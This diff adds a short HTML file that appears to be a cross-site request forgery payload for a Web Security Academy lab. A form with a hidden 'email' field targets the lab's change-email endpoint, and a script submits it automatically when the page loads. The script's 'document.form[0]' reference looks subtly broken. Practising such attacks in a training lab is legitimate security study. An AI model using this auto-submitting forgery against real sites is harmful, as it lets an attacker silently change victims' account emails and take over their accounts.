@@ -1,0 +1,6 @@
+<form action="https://0ab500d203652b3a805d030100a60069.web-security-academy.net/my-account/change-email">
+<input type="hidden" name="email" value="anything@academy.net">
+<script>
+        document.form[0].submit();
+        </script>
+        
